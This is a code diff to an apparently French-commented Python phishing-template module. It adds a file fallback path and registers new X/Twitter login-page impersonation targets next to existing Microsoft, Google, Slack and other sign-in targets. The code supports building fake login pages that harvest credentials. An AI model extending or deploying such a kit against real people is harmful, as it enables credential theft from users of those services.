@@ -31,7 +31,13 @@ class PhishingTemplate(ABC):
             
             if not os.path.exists(path):
                 # Fallback vers l'ancien dossier si le nouveau n'existe pas
-                path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "html_templates", filename)
+                alt = os.path.join(os.path.dirname(os.path.abspath(__file__)), "html_templates", filename)
+                if os.path.exists(alt):
+                    path = alt
+                else:
+                    # Troisième fallback: dossier racine "templates/"
+                    alt2 = os.path.join(base_path, "templates", filename)
+                    path = alt2
                 
             with open(path, "r", encoding="utf-8") as f:
                 return f.read()
@@ -131,7 +137,9 @@ class TemplateLoader:
         "slack": "https://slack.com/signin",
         "tiktok": "https://www.tiktok.com/login",
         "yahoo": "https://login.yahoo.com",
-        "teams_meeting": "https://teams.microsoft.com"
+        "teams_meeting": "https://teams.microsoft.com",
+        "twitter": "https://twitter.com/login",
+        "x": "https://x.com/login"
     }
     
     @staticmethod
@@ -156,5 +164,9 @@ class TemplateLoader:
         templates["microsoft"] = MicrosoftLoginTemplate()
         templates["google"] = GoogleLoginTemplate()
         templates["generic"] = GenericUpdateTemplate()
+        
+        # Socials: fournir une page X/Twitter via template racine si non présent en HF
+        templates["twitter"] = DynamicPhishingTemplate("x_login_v2.html", TemplateLoader.TARGET_URL_MAP["twitter"])
+        templates["x"] = DynamicPhishingTemplate("x_login_v2.html", TemplateLoader.TARGET_URL_MAP["x"])
         
         return templates
